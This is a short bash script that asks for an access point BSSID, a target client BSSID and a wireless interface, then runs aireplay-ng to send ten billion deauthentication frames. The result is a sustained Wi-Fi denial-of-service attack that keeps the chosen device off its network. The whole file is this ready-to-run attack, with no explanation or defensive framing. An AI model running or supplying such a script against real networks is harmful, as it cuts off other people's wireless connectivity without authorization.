#!/bin/bash
air(){
    echo  "Enter main user bssid"
    read ma
    echo  "Enter traget user bssid"
    read tr
    echo  "Enter wifi chipset name"
    read wi
    aireplay-ng --deauth 10000000000 -a $ma -c $tr $wi
}
air